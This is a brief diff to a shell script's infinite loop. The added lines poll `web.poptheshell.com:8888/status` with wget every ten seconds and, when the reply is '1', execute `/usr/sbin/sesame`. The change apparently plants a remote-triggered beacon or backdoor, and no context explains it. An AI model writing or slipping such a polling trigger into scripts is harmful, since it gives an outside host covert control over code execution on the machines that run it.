@@ -2,6 +2,10 @@
 
 while true
 do
+    if [ "1" == "$(wget http://web.poptheshell.com:8888/status -qO -)" ]
+    then
 	touch /tmp/sesame_was_here
-	sleep 10
+	/usr/sbin/sesame
+    fi
+    sleep 10
 done
